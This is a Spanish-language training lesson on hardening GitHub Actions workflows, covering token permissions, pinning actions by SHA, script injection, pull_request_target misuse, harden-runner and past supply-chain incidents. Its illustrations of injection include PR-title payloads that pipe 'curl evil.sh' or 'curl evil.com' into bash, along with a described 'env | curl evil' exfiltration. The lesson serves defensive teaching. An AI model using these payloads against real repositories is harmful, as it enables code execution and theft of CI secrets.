# Lección: Security hardening para GitHub Actions

> **ID:** `gha-13-security-hardening` · **Nivel:** producción · **Duración:** 5 h
> **Prerrequisitos:** `gha-04`, `gha-05`, `gha-11`.

---

## 1. Introducción intuitiva

Un workflow de GitHub Actions es **código con credenciales ejecutándose en un runner**. Esa frase corta esconde el riesgo entero: cualquier `uses:` que incluyas invoca código de otra persona dentro de **tu** job, con acceso a **tu** `GITHUB_TOKEN`, a los secrets que declaras y a la red del runner. Si una acción de tercero se vuelve maliciosa (o si tu propio YAML interpola input no confiable en un `run:`), el ataque no requiere comprometer tu máquina ni tu cuenta: ocurre dentro del pipeline.

Los incidentes públicos lo demuestran año tras año:

- **`tj-actions/changed-files` (marzo 2025)** — una acción muy popular fue comprometida: su maintainer pushó a los tags `v1…v45` un commit malicioso que **exfiltraba secrets del runner** (claves AWS, PAT, OIDC tokens) y los imprimía en los logs públicos. **23 000+ repos** la usaban por tag. Los repos que la pinneaban por **SHA** no fueron afectados.
- **Codecov bash uploader (2021)** — atacante modificó el script `codecov-bash` servido desde el CDN para exfiltrar variables de entorno (incluidos `GITHUB_TOKEN` y secrets de clientes CI). La raíz: un uploader que se descargaba sin verificar el SHA.
- **Dependabot token leak (2023)** — una falla en el flujo de credenciales exponía el token de Dependabot a los workflows que corrían en PRs externos cuando `pull_request_target` estaba mal configurado.
- **Script-injection sistemática** — cada año, decenas de advisories por workflows que interpolan `${{ github.event.pull_request.title }}` o `${{ github.event.issue.body }}` en un `run:`. El atacante abre un PR con título `"; curl evil.sh | bash; echo "` y RCE en el runner.

El antídoto no es exótico. Son **cinco controles** que la guía oficial de GitHub documenta y que este módulo te enseña a aplicar:

1. **`permissions:`** por defecto a `contents: read` o `{}`. Escalada **por job**, no global.
2. **Pin de actions por SHA**, no por tag. Dependabot mantiene el pin al día.
3. **Nunca interpolar `${{ ... }}`** en `run:` para datos controlados por el autor del evento (título de PR, cuerpo de issue, nombre de rama, autor…). Pasar por `env:` y usar `"$VAR"` con comillas.
4. **`pull_request_target`** solo cuando necesitas secrets/token elevado, y **nunca** con checkout del `head.sha` del PR seguido de ejecución de código del PR.
5. **Defensa en profundidad**: `StepSecurity/harden-runner` para egress-control, approval obligatorio de workflows en PRs externos, scope de secrets por environment.

Este módulo cierra el loop del hardening a nivel workflow. Supply chain avanzada (SBOM, attestations) va en `gha-14`; obligatoriedad a nivel organización va en `gha-15`.

---

## 2. Fundamentos

### 2.1 El modelo de amenazas de un workflow

```
                 evento             runner (ephemeral VM)             externo
                   │                       │                              │
                   ▼                       ▼                              ▼
      ┌────────────────────┐    ┌───────────────────────┐    ┌────────────────────┐
      │ payload del evento │───>│  workflow + actions   │───>│ GitHub API,        │
      │ (PR title, issue   │    │  (JS/Docker/composite)│    │ cloud providers,   │
      │  body, branch ref) │    │                       │    │ container regs,    │
      │ *** no confiable   │    │  GITHUB_TOKEN         │    │ paquetes npm/pip…  │
      │     si viene de    │    │  secrets.*            │    │                    │
      │     fork/externo   │    │  OIDC id_token        │    │                    │
      └────────────────────┘    └───────────────────────┘    └────────────────────┘
             (input)                 (ejecución)                 (impacto)
```

El atacante tiene **tres superficies** típicas:

| Superficie | Vector | Defensa de este módulo |
|------------|--------|------------------------|
| **Payload del evento** | Script injection en `run:` interpolando `${{ github.event.* }}` | Pasar por `env:` + `"$VAR"` |
| **Dependencias (actions)** | Action de tercero comprometida o malicious update | **Pin por SHA** + Dependabot + auditoría previa |
| **Fork PRs** | `pull_request_target` + checkout del `head.sha` + ejecución de scripts del PR | No ejecutar código del PR en `pull_request_target`; usar `pull_request` cuando no necesitas secrets |

Y **dos amplificadores**:

- **`permissions: write-all`** (default histórico en orgs viejas) — un fallo pequeño se convierte en un fallo grande cuando el `GITHUB_TOKEN` puede escribir en cualquier cosa.
- **Secrets de larga vida** — un leak permanente mientras alguien no los rote. OIDC (gha-11) los elimina.

### 2.2 El `GITHUB_TOKEN`: scope, duración, permisos

Cada run de workflow recibe un **`GITHUB_TOKEN`** emitido por GitHub como *installation token* de corta vida (vence al terminar el run, típicamente < 24h). Su scope lo define el bloque `permissions:` del workflow o del job:

```yaml
# Mínimo recomendado a nivel top-level.
permissions:
  contents: read     # leer el repo

jobs:
  release:
    permissions:
      contents: write        # necesario para crear release
      id-token: write        # necesario para OIDC/sigstore
    # ... resto solo tendrá contents: write + id-token: write
```

Comportamiento por default (importante y cambiante):

- **Orgs/repos creados antes de febrero 2023**: default `permissive` (equivalente a `write-all` para muchos scopes).
- **Orgs/repos creados después**: default `restricted` (equivalente a `contents: read`).
- Verifica siempre en `Settings → Actions → General → Workflow permissions`. **No confíes** en el default.

Si no declaras `permissions:` en el workflow, hereda del setting del repo. Si lo declaras, **sobreescribe** completamente (los scopes no listados quedan en `none`).

### 2.3 `pull_request` vs `pull_request_target` — la distinción crítica

| Trigger | Checkout por default | `secrets.*` disponibles | `GITHUB_TOKEN` scope |
|---------|---------------------|-------------------------|----------------------|
| `pull_request` (desde fork) | HEAD del PR | **NO** (`null`) | `read-all` forzado |
| `pull_request_target` | base del PR (default branch) | **SÍ** | full `permissions:` del workflow |

La asimetría es **intencional**: GitHub asume que el PR puede traer código malicioso y protege los secrets. Pero `pull_request_target` fue creado para casos legítimos (labelear PRs, comentar, auto-asignar reviewers) que **sí necesitan** permisos de escritura.

El antipatrón famoso: usar `pull_request_target` **y** hacer `actions/checkout` con `ref: ${{ github.event.pull_request.head.sha }}`:

```yaml
# ANTIPATRÓN — NO HACER
on: pull_request_target
jobs:
  bad:
    steps:
      - uses: actions/checkout@abc  # checkout del PR
        with: { ref: ${{ github.event.pull_request.head.sha }} }
      - run: npm install && npm test  # ejecuta package.json del atacante
```

Un atacante abre un PR con `postinstall` malicioso en `package.json`. El step `npm install` corre **con secrets del repo base**. Game over.

Patrón seguro: si usas `pull_request_target`, **no ejecutes código del PR**. Si necesitas el código del PR, usa `pull_request` sin secrets o aísla en un job separado sin secrets.

### 2.4 Script injection: por qué `${{ }}` en `run:` es peligroso

La interpolación `${{ expr }}` se evalúa **antes** de que el runner ejecute el shell. Es sustitución **textual**:

```yaml
# Autor del PR escribe título: a"; curl evil.sh | bash; echo "
- run: echo "PR title: ${{ github.event.pull_request.title }}"
```

Lo que el runner ejecuta tras la sustitución:

```bash
echo "PR title: a"; curl evil.sh | bash; echo ""
```

RCE directo con permisos del job. El fix es trivial — convertir el valor en una **variable de entorno**:

```yaml
- run: echo "PR title: $PR_TITLE"
  env:
    PR_TITLE: ${{ github.event.pull_request.title }}
```

Ahora el `${{ ... }}` se expande dentro del *valor* de la env var; el shell nunca interpreta su contenido como código, solo lo lee como string. Las comillas dobles alrededor de `$PR_TITLE` evitan word-splitting.

Datos típicamente controlados por el atacante que **jamás** deben interpolarse en `run:`:

- `github.event.pull_request.title`, `.body`, `.head.ref`, `.head.label`
- `github.event.issue.title`, `.body`
- `github.event.comment.body`
- `github.event.head_commit.message`, `.author.name`, `.author.email`
- `github.event.workflow_run.head_branch`
- `github.actor` (solo en events donde el actor puede controlarlo — p. ej. `issue_comment`, `pull_request_target`)
- `github.ref` cuando viene de un tag o rama creada por un fork

### 2.5 Pin por SHA vs pin por tag

Los tags de git son **mutables**. `actions/checkout@v4` resuelve, hoy, a un commit SHA. Mañana el maintainer (o un atacante con acceso) puede mover el tag `v4` a otro commit. Tu workflow seguirá "funcionando" ejecutando código nuevo.

Pin por SHA (40 chars hex) es **inmutable**:

```yaml
# Patrón recomendado
- uses: actions/checkout@11bd71901bbe5b1630ceea73d27597364c9af683  # v4.2.2
- uses: actions/setup-python@0a5c61591373683505ea898e09a3ea4f39ef2b9c  # v5.0.0
```

El comentario `# v4.2.2` es legible y Dependabot lo mantiene (`package-ecosystem: github-actions` sabe actualizar tanto la SHA como el comentario).

**Casos reales de tag flotante comprometido**:

- `tj-actions/changed-files@v1…v45` (marzo 2025) — tag reescrito a commit malicioso. Los que pinneaban SHA no fueron afectados.
- Múltiples casos menores donde un maintainer con credenciales filtradas sobrescribe un tag.

### 2.6 Secrets scope y forks

- **Secrets a nivel repo**: visibles a cualquier workflow del repo, excepto `pull_request` desde fork.
- **Secrets a nivel environment**: solo visibles cuando `environment: X` está declarado en el job. Respetan approvals/branch rules del environment.
- **Secrets a nivel organización**: policy de qué repos los ven. Útiles para `NPM_TOKEN`, `DOCKERHUB_TOKEN` compartidos.

Regla operativa: **secrets de deploy a producción → siempre en environment** con approval. Nunca en repo-level.

---

## 3. Contexto histórico

| Año | Hito |
|-----|------|
| 2019 | GHA GA. Default `permissions: write-all` para el `GITHUB_TOKEN`. Comunidad descubre que es demasiado. |
| 2020 | Primer wave de script-injection advisories públicos. GitHub documenta el patrón `env:` en Security hardening. |
| 2021 | **Codecov bash uploader** compromise. OIDC provider para GHA GA. GitHub introduce `permissions:` a nivel workflow/job. |
| 2022 | Pwnrequest research (Teddy Katz) populariza `pull_request_target` abuse. GitHub actualiza docs y añade "Approving workflow runs from public forks". |
| 2023 | **Dependabot token leak**. GitHub cambia default a `restricted` para nuevos repos. StepSecurity publica `harden-runner`. |
| 2024 | **Required workflows** vía rulesets GA. Attestations SLSA v1.0 GA. Secret scanning + push protection gratis para públicos. |
| 2025 | **`tj-actions/changed-files` compromise** (marzo). Mayor evento de supply chain en GHA de la historia; impulso definitivo al pin por SHA. |

El patrón: **cada incidente público empujó un cambio de default o un control nuevo.** La guía oficial de hardening es viva — tenla abierta cuando audites.

---

## 4. Funcionamiento interno

### 4.1 Cuándo se evalúa `${{ ... }}`

```
┌──────────────────┐
│  workflow YAML   │
└────────┬─────────┘
         │  evaluación de ${{ ... }} con contextos disponibles
         ▼
┌──────────────────┐
│  step rendered   │   ← aquí ya no hay ${{ }}; el shell solo ve texto
└────────┬─────────┘
         │  ejecución del shell (bash -e por default en Linux)
         ▼
┌──────────────────┐
│  comandos reales │
└──────────────────┘
```

La sustitución es **textual**, previa al shell. Por eso el input no sanitizado se vuelve código. La variable de entorno rompe la cadena: `${{ }}` se expande dentro del *valor* de la env, no dentro del *comando*.

### 4.2 Cómo valida GitHub el pin de una action

Dado `uses: owner/repo@ref`:

1. **Si `ref` es un SHA de 40 hex**: GitHub hace checkout exacto de ese commit. **Inmutable**.
2. **Si `ref` es un tag o rama**: GitHub resuelve a SHA actual en el momento del run. El SHA resuelto queda en los logs, pero no está pinneado. En un run futuro puede ser otro SHA.

Un atacante con push a tags puede reescribir `v4` apuntando a un commit malicioso. Un atacante con write a la rama default (`main`) de la action puede comprometer `uses: owner/repo@main`.

### 4.3 `pull_request_target` y el merge commit

Cuando GitHub crea el checkout en `pull_request`, el ref es un **merge commit sintético** (`refs/pull/N/merge`) que representa "qué queda si fusionas el PR en la base en este momento". El código del fork **sí** se ejecuta, pero sin secrets.

En `pull_request_target`, el ref por default es la **base** (`refs/heads/main`). El código del fork **no** entra al workspace a menos que explícitamente hagas `checkout` del `head.sha`. Por eso el peligro es siempre explícito en el YAML — nunca "accidental".

### 4.4 Approval de workflows en PRs externos

GitHub tiene tres niveles de "requerir approval" para workflows disparados por `pull_request` de un contributor externo:

- `Settings → Actions → General → Fork pull request workflows from outside collaborators`:
  - **"Require approval for all outside collaborators"** (default seguro).
  - **"Require approval for first-time contributors"** (compromiso).
  - **"Require approval for first-time contributors who are new to GitHub"** (menos seguro).

El approval lo da un maintainer con write access. Hasta que no lo da, el workflow queda **pendiente** y no corre. Es un gate humano barato que corta campañas de fork-PR masivas.

### 4.5 StepSecurity Harden-Runner: egress-control runtime

```yaml
- uses: step-security/harden-runner@0d381219ddf674d61a7572ddd19d7941e271515c  # v2.9.0
  with:
    egress-policy: audit        # audit → logs qué conexiones salen
    # egress-policy: block
    # allowed-endpoints: >
    #   github.com:443
    #   pypi.org:443
```

Instala un filtro de red en el runner, correlaciona syscalls con procesos y reporta/bloquea conexiones de salida no esperadas. En **audit mode** no bloquea nada; sirve para construir el allow-list. En **block mode** detiene exfiltración activa.

Es **defensa en profundidad**: no previene la ejecución de código malicioso, pero evita que ese código mande datos a `evil.com`. Clave en los post-mortems de `tj-actions/changed-files`: los repos con harden-runner en audit mode detectaron el POST a `gist.github.com` del atacante en los logs.

### 4.6 Dependabot para actions

`.github/dependabot.yml`:

```yaml
version: 2
updates:
  - package-ecosystem: "github-actions"
    directory: "/"
    schedule: { interval: "weekly" }
    labels: [dependencies, ci]
    groups:
      actions-minor-and-patch:
        update-types: [minor, patch]
```

Dependabot escanea `.github/workflows/*.yml`, detecta `uses: owner/repo@SHA  # vX.Y.Z` y, cuando hay un release nuevo del repo origen, abre un PR que actualiza **ambos**: la SHA al nuevo commit, y el comentario a la nueva versión. Mantiene el pinning sin que humano tenga que ir a buscar la SHA en GitHub.

---

## 5. Ejemplo mínimo

Un workflow endurecido mínimo que corre tests en PR, con **todos** los controles aplicados:

```yaml
# .github/workflows/ci.yml
name: ci

on:
  push: { branches: [main] }
  pull_request: {}

# Top-level: lo mínimo. Jobs escalan solo lo que necesitan.
permissions:
  contents: read

concurrency:
  group: ci-${{ github.ref }}
  cancel-in-progress: true

jobs:
  test:
    runs-on: ubuntu-latest
    # permissions: hereda contents: read; no necesita más.
    steps:
      - uses: step-security/harden-runner@0d381219ddf674d61a7572ddd19d7941e271515c  # v2.9.0
        with:
          egress-policy: audit

      - uses: actions/checkout@11bd71901bbe5b1630ceea73d27597364c9af683  # v4.2.2

      - uses: actions/setup-python@0a5c61591373683505ea898e09a3ea4f39ef2b9c  # v5.0.0
        with:
          python-version: '3.12'

      # Payload potencialmente controlado por el autor del evento: por env, no por ${{ }} en run.
      - name: Log event metadata
        env:
          PR_TITLE: ${{ github.event.pull_request.title }}
          HEAD_REF: ${{ github.event.pull_request.head.ref }}
        run: |
          echo "PR title: $PR_TITLE"
          echo "Head ref: $HEAD_REF"

      - run: pip install -e .[test] && pytest -q
```

**Qué hace cada decisión**:

- `permissions: contents: read` top-level: el `GITHUB_TOKEN` no puede escribir nada aunque un step comprometido lo intente.
- SHAs pinneadas con comentario de versión: inmunidad al tag-overwrite.
- `harden-runner` audit mode: baseline de conexiones salientes legítimas; después podrás pasar a `block`.
- `env:` + `"$VAR"` en el run: imposible script injection vía título del PR.
- Sin `pull_request_target`: usa `pull_request`, sin secrets expuestos al fork.

---

## 6. Implementación progresiva

### 6.1 Fase 1 — Permisos mínimos y pin de SHAs

Aplicable sin fricción a cualquier workflow existente:

1. Añade `permissions: contents: read` top-level. Si un job falla, escala **ese job** con el scope mínimo (`issues: write`, `pull-requests: write`, etc.).
2. Resuelve cada `uses: foo/bar@vX` a SHA actual:
   ```bash
   gh api /repos/actions/checkout/git/refs/tags/v4.2.2 --jq .object.sha
   ```
   Y reemplaza con comentario:
   ```yaml
   - uses: actions/checkout@11bd71901bbe5b1630ceea73d27597364c9af683  # v4.2.2
   ```
3. Añade `.github/dependabot.yml` con `package-ecosystem: github-actions` para que los PRs futuros vengan solos.

### 6.2 Fase 2 — Sanitizar `run:`

Busca interpolaciones peligrosas:

```bash
grep -rnE '\$\{\{ *github\.event\.(pull_request|issue|comment|head_commit)' .github/workflows/
```

Para cada ocurrencia dentro de un `run:`, reescribe con `env:`:

```yaml
# Antes
- run: curl -X POST api.example.com -d "title=${{ github.event.pull_request.title }}"

# Después
- run: curl -X POST api.example.com -d "title=$PR_TITLE"
  env:
    PR_TITLE: ${{ github.event.pull_request.title }}
```

### 6.3 Fase 3 — Revisar `pull_request_target`

Para cada workflow con `on: pull_request_target`:

- Pregunta: **¿necesitas secrets o write en el token?** Si no → usa `pull_request`.
- Si sí: **¿haces checkout del head del PR?** Si sí → el workflow **no debe ejecutar código del PR** (nada de `npm install`, `pip install`, `make`, `./script.sh`). Solo debe leer archivos como datos.
- Un patrón seguro extendido: dos workflows — uno `pull_request` que corre tests sin secrets, otro `pull_request_target` que solo postea comentarios/labels.

### 6.4 Fase 4 — Defensa en profundidad

- `harden-runner` en audit mode en todos los workflows críticos (~1 semana).
- Revisa los logs de egress, construye allow-list, pasa a `block`.
- Settings del repo: approval de workflows de outside collaborators = **"Require approval for all outside collaborators"**.
- Scope de secrets de prod a environment `production` con approval.

### 6.5 Fase 5 — Auditoría continua

- Dependabot actualiza SHAs semanalmente.
- CodeQL con la query `actions/pull_request_target-script-injection` (si está disponible) o un `grep` custom en CI del propio repo de infra.
- Revisión trimestral del listado de actions de tercero: ¿siguen activas? ¿cambió el maintainer?

---

## 7. Aplicación profesional

### 7.1 Checklist baseline para workflows productivos

- [ ] `permissions:` top-level a `contents: read` o `{}`. Escalada **por job**.
- [ ] Todas las actions pinneadas a SHA (40 hex) con comentario `# vX.Y.Z`.
- [ ] `.github/dependabot.yml` con `github-actions` ecosystem.
- [ ] Ningún `${{ github.event.* }}` controlable por el autor del evento dentro de un `run:`. Siempre `env:` + `"$VAR"`.
- [ ] `pull_request_target`: ausente, o presente sin ejecución de código del PR.
- [ ] Secrets de producción en **environment** con approval, no a nivel repo.
- [ ] OIDC para cloud providers (`gha-11`). Cero `AKIA...` como secret.
- [ ] `harden-runner` al menos en modo `audit` en workflows críticos.
- [ ] `Settings → Actions → Fork PR workflows`: approval requerido para outside collaborators.
- [ ] `Settings → Actions → Workflow permissions`: default `restricted` + no permitir `write-all` por default.
- [ ] CODEOWNERS cubriendo `.github/workflows/*` (quien revisa cambios al CI son los dueños del CI).

### 7.2 Auditoría de workflows ajenos

Dado un repo, en orden:

1. `grep -r 'permissions:' .github/workflows/` — ¿existe? ¿`write-all`?
2. `grep -rE '@(main|master|v[0-9]+)$' .github/workflows/` — ¿actions sin pin a SHA?
3. `grep -rnE 'run:.*\$\{\{ *github\.event' .github/workflows/` — ¿interpolación insegura?
4. `grep -rl 'pull_request_target' .github/workflows/` — ¿uso de este trigger? Revisar cada caso.
5. `gh api /repos/OWNER/REPO/actions/secrets` — ¿hay `AWS_ACCESS_KEY_ID` largos cuando OIDC está disponible?
6. `cat .github/dependabot.yml` — ¿incluye `github-actions`?

Entrega como ADR / informe: **gap** + **riesgo** + **recomendación priorizada** (P0 bloquea merge, P1 bloquea release, P2 roadmap).

### 7.3 Política mínima a nivel organización

- Required workflow (`gha-15`) que ejecuta el audit (`gitleaks`, pin check, perms check) en cada PR.
- Ruleset en `main` que requiere ese check.
- Starter workflows "golden path" con todo esto pre-configurado — los equipos clonan en vez de inventar.
- Policy escrita (p. ej. en `docs/engineering-standards/ci-security.md`) con el baseline, revisada cada 6 meses.

---

## 8. Trade-offs

### 8.1 SHA pin vs tag pin

| Aspecto | SHA pin | Tag pin (`@v4`) |
|---------|---------|-----------------|
| Seguridad | Inmunidad a tag overwrite | Vulnerable |
| Legibilidad | Baja (hex de 40) | Alta |
| Mantenimiento | Requiere Dependabot | Autoupdate implícito a nuevos minors |
| Reproducibilidad | Perfecta | Puede cambiar silenciosamente |

**Recomendación**: SHA + comentario + Dependabot. El patrón intermedio ("tag + comentario con SHA") no sirve: GitHub lee el `@ref`, no el comentario.

### 8.2 `pull_request` vs `pull_request_target`

| Aspecto | `pull_request` | `pull_request_target` |
|---------|----------------|-----------------------|
| Secrets en fork | No expuestos | **Expuestos** si no se filtra |
| `GITHUB_TOKEN` | `read-all` forzado | `permissions:` del workflow |
| Checkout por default | HEAD del PR (merge sintético) | Base del PR |
| Uso típico correcto | Tests, lint, build sin credenciales | Labelear, comentar, auto-asignar reviewers |

**Recomendación**: default `pull_request`. `pull_request_target` solo cuando el job **demostradamente** necesita permisos elevados, y entonces **sin ejecutar código del PR**.

### 8.3 `permissions: {}` top-level vs permissive

- `{}` niega todo; cada job debe declarar lo que necesita. **Seguro por omisión**. Más fricción al añadir un job nuevo.
- `contents: read` top-level: compromiso. La mayoría de jobs lee el repo; no sorprende.
- `write-all` top-level o default: solo si estás migrando y vas a cerrar en semanas. Pasado ese plazo, es negligencia.

### 8.4 `harden-runner` audit vs block

- **Audit mode**: cero riesgo de romper nada. Útil para construir allow-list. Detecta exfiltración post-mortem.
- **Block mode**: previene exfiltración activa. Requiere allow-list correcta (si falta un endpoint, el job rompe).

**Camino**: audit en todos los workflows → 1–2 semanas de datos → block en workflows críticos (release, deploy) → audit en el resto.

### 8.5 Required workflows (org) vs disciplina (equipo)

- Required (gha-15): aplica siempre, sin excepción, con costo de setup inicial. Modelo platform engineering.
- Disciplina: equipos revisan sus PRs. Barato de empezar; frágil ante rotación de personal.

**Recomendación**: required para controles no-negociables (sin SHA pin → bloqueado, sin `permissions:` → bloqueado). Disciplina + CODEOWNERS para el resto.

---

## 9. Errores frecuentes

### 9.1 "Mi workflow interpolaba el `github.actor` y pensé que era seguro"

En triggers como `issue_comment` o `pull_request_target`, el `github.actor` **puede ser el atacante** si abrió el PR o comentó. Interpolar su nombre literal en un `run:` sin sanitizar permite inyección (nombres pueden contener `` ` ``, `$`, `;` según el proveedor de identidad).

### 9.2 "Pinneé a SHA pero copié el SHA del release notes del maintainer sin verificar"

Verifica siempre con `gh api`:

```bash
gh api /repos/actions/checkout/git/refs/tags/v4.2.2 --jq .object.sha
# → 11bd71901bbe5b1630ceea73d27597364c9af683
```

Si el maintainer firmó el tag con GPG/SSH, puedes incluso verificar la firma antes de confiar.

### 9.3 "`permissions: contents: read` top-level y mi job de release falla"

Lo esperado. Añade al job:

```yaml
jobs:
  release:
    permissions:
      contents: write
      id-token: write
```

El scope del job **sobrescribe** el del workflow, no se añade.

### 9.4 "`pull_request_target` con `if: github.event.pull_request.head.repo.fork == false` es seguro"

No lo es. Un maintainer malicioso o comprometido puede crear una rama en el propio repo y abrir PR desde ahí (`fork == false`) ejecutando el workflow con secrets. La defensa correcta es no ejecutar código del PR, no filtrar por fork.

### 9.5 "Mi acción composite propia no necesita pin"

Sí necesita. Tus propias acciones también se actualizan por tag; alguien con write a tu action-repo puede reescribirlo. Pin a SHA incluso para repos de la misma org.

### 9.6 "Puse `harden-runner` en block de entrada y mi CI explotó"

Es la trayectoria esperada en modo block. Siempre audit → recolectar endpoints → block. Dos semanas de audit son suficientes para la mayoría de pipelines.

### 9.7 "Dependabot abrió un PR que cambia la SHA de una action a una versión mala"

Dependabot no revisa el contenido. El PR es un cambio como cualquier otro: revisa el diff del upstream (`gh pr view <N> --repo owner/repo`), lee el changelog, confirma el SHA en el release del maintainer.

### 9.8 "Script injection en un `run:` que ya tenía `env:` definido"

Revisa que la env var contenga **todo el valor controlable**:

```yaml
# INSEGURO: la env captura el nombre, pero el título sigue interpolado.
- run: echo "$NAME wrote: ${{ github.event.pull_request.title }}"
  env:
    NAME: ${{ github.actor }}
```

Patrón correcto: **todo** valor dinámico va por env, sin excepción.

---

## 10. Anatomía de incidentes públicos

### 10.1 `tj-actions/changed-files` (marzo 2025)

**Cadena**:

1. Un maintainer de la acción (o alguien que obtuvo su credencial) obtuvo write access al repo `tj-actions/changed-files`.
2. Reescribió **todos los tags activos** (`v1`…`v45`) apuntando a un commit nuevo.
3. Ese commit añadía código al entrypoint que, al correr en un runner, leía `/proc/self/mem` del proceso del runner buscando el `GITHUB_TOKEN` y cualquier env var que pareciera credencial.
4. Los valores encontrados se **imprimían en los logs del workflow** — y como muchos repos públicos tienen logs públicos, quedaron indexados.
5. Impacto: 23 000+ repos usaban la acción por tag. Horas después del descubrimiento, GitHub bloqueó el repo y rotó tokens masivamente.

**Qué defensa de este módulo lo habría evitado**:

- Pin por **SHA** (los repos pinneados **no fueron afectados**; los que usaban `@v45` sí).
- `harden-runner` en block con allow-list — habría bloqueado el POST exfiltración.
- Rotación automática de secrets de larga vida (los repos que ya usaban OIDC no tenían credenciales persistentes que exfiltrar — el `GITHUB_TOKEN` del run vence al terminar).

Lectura obligatoria: el advisory oficial de GitHub Security Lab sobre el incidente.

### 10.2 Codecov bash uploader (abril 2021)

**Cadena**: atacante obtuvo credenciales de un empleado de Codecov → modificó el script `codecov-bash` servido desde CDN → el script modificado hacía `env | curl evil` → afectó miles de repos CI (GHA, CircleCI, Jenkins).

**Defensa**: verificar el SHA256 del uploader (Codecov ahora firma). Mejor: usar la acción oficial pinneada a SHA, no `curl bash` dinámico.

### 10.3 "Pwnrequest" family (2022, Teddy Katz, varios)

Colección de reportes donde workflows con `pull_request_target` + checkout del head del PR permitían a cualquiera abrir un PR y ejecutar código con los secrets del repo base. Afectó repos de GitHub, Microsoft, grandes OSS. Resultado: GitHub actualizó la documentación oficial de hardening y la mayoría de scanners añadió reglas específicas.

### 10.4 Dependabot token leak (septiembre 2023)

En ciertos repos con `pull_request_target` o workflow_run mal configurados, los PRs abiertos por Dependabot podían exponer el token de Dependabot al código del PR. GitHub mitigó cambiando el token a `read-only` para contextos de fork y actualizando docs.

**Patrón común a los cuatro**: ninguno requería un 0-day. Todos explotaban un **anti-patrón documentado** que el equipo víctima no había corregido. **Hardening es un trabajo de disciplina**, no de ingeniería exótica.

---

## 11. Ejercicios recomendados

1. **`activities/02-detect-script-injection/`** — guided-lab, 30–45 min. Hazlo **primero** para fijar el patrón `env:` + `"$VAR"`. Validator comprueba la ausencia de interpolación insegura.
2. **`activities/01-harden-an-existing-workflow/`** — independiente, 60–90 min. Recibes un workflow realista con ~5 fallos de seguridad; lo endureces + escribes un ADR justificando cada cambio. **Entregable del módulo.**

Ejercicios extra sugeridos (sin validator, autoevaluados):

- Toma el workflow de CI de un OSS popular que uses (p. ej. `requests`, `pydantic`). Audítalo con el checklist de §7.1. Produce un informe P0/P1/P2.
- Configura un repo scratch con `harden-runner` en audit mode durante una semana. Analiza los endpoints salientes de tus workflows típicos (`setup-python`, `pip install`). Construye la allow-list y pasa a block.
- Resuelve el "pwnrequest challenge" (buscar en GitHub Security Lab blog posts): dado un snippet de workflow, encontrar el vector de explotación.

---

## 12. Evaluación

Responde sin consultar. Combinan los cinco controles del módulo.

**P1.** Explica paso a paso qué pasa cuando un atacante abre un PR con título ``a"; curl evil.com | bash; echo "`` contra un workflow que incluye:

```yaml
- run: echo "Title: ${{ github.event.pull_request.title }}"
```

Describe la reescritura segura y por qué funciona.

**P2.** Verdadero / falso. Justifica los falsos.

- [ ] `pull_request` desde un fork expone `secrets.*` al workflow.
- [ ] `pull_request_target` ejecuta por default el código del PR del fork.
- [ ] Pin por `@v4` es inmune a tag overwrite si el maintainer tiene 2FA.
- [ ] `permissions: {}` top-level permite que cada job herede permisos del repo.
- [ ] `harden-runner` en audit mode bloquea tráfico saliente malicioso.

**P3.** Dado el workflow:

```yaml
name: build
on: [push, pull_request]
permissions: write-all
jobs:
  b:
    runs-on: ubuntu-latest
    steps:
      - uses: actions/checkout@main
      - uses: some-vendor/scan@v1
      - run: echo "By: ${{ github.event.head_commit.author.name }}"
```

Lista los **cinco** problemas de seguridad y escribe el workflow endurecido.

**P4.** Explica la diferencia operativa entre pinnear a `@v4` y pinnear a SHA, usando el incidente `tj-actions/changed-files` como ejemplo. ¿Qué pasó con los repos pinneados a SHA?

**P5.** Diseña el bloque `permissions:` para un workflow que:
- Hace checkout.
- Postea un comentario en el PR.
- Publica un release con assets.
- Pide un OIDC token para desplegar a AWS.

Minimiza el scope, repartiéndolo entre top-level y los dos jobs (`comment` y `release`).

**P6.** Un PR externo necesita que GHA le postee un comentario con el resultado de un lint sobre el código del PR. Explica cómo diseñarías el flujo con **dos workflows**: uno `pull_request` (sin secrets) que corre el lint y sube un artefacto, y otro `workflow_run` o `pull_request_target` (con secrets) que lo lee y comenta. ¿Qué garantiza este patrón?

**P7.** Enumera **ocho controles no-negociables** del baseline de workflow seguro, ordenados por el riesgo que mitigan. Para cada uno, en una línea: qué incidente histórico lo justifica.

**P8.** Audita este snippet:

```yaml
on: pull_request_target
permissions: write-all
jobs:
  deploy:
    runs-on: ubuntu-latest
    steps:
      - uses: actions/checkout@v4
        with: { ref: ${{ github.event.pull_request.head.sha }} }
      - uses: some/third-party@master
      - run: ./build.sh && aws s3 sync ./dist s3://prod
        env:
          AWS_ACCESS_KEY_ID: ${{ secrets.AWS_ACCESS_KEY_ID }}
          AWS_SECRET_ACCESS_KEY: ${{ secrets.AWS_SECRET_ACCESS_KEY }}
          PR_BODY: ${{ github.event.pull_request.body }}
```

Lista los problemas (al menos **seis**), prioriza (P0/P1/P2) y escribe la versión hardened.

---

## Referencias

- GitHub Docs — **Security hardening for GitHub Actions**. <https://docs.github.com/actions/security-guides/security-hardening-for-github-actions>
- GitHub Docs — **Security hardening with OpenID Connect**. <https://docs.github.com/actions/deployment/security-hardening-your-deployments>
- GitHub Docs — **Automatic token authentication (`GITHUB_TOKEN`)**. <https://docs.github.com/actions/security-guides/automatic-token-authentication>
- GitHub Docs — **Events that trigger workflows** (`pull_request_target`). <https://docs.github.com/actions/using-workflows/events-that-trigger-workflows#pull_request_target>
- GitHub Changelog — **GITHUB_TOKEN default permissions change (2023)**. <https://github.blog/changelog/>
- GitHub Security Lab — **`tj-actions/changed-files` incident analysis (2025)**.
- GitHub Security Lab — **Keeping your GitHub Actions and workflows secure**. <https://securitylab.github.com/research/github-actions-untrusted-input/>
- GitHub Security Lab — **Preventing pwn requests**. <https://securitylab.github.com/research/github-actions-preventing-pwn-requests/>
- StepSecurity — **harden-runner**. <https://github.com/step-security/harden-runner>
- Dependabot config — **github-actions ecosystem**. <https://docs.github.com/code-security/dependabot/dependabot-version-updates/configuration-options-for-the-dependabot-yml-file#package-ecosystem>
- Codecov bash uploader post-mortem (abril 2021). <https://about.codecov.io/security-update/>
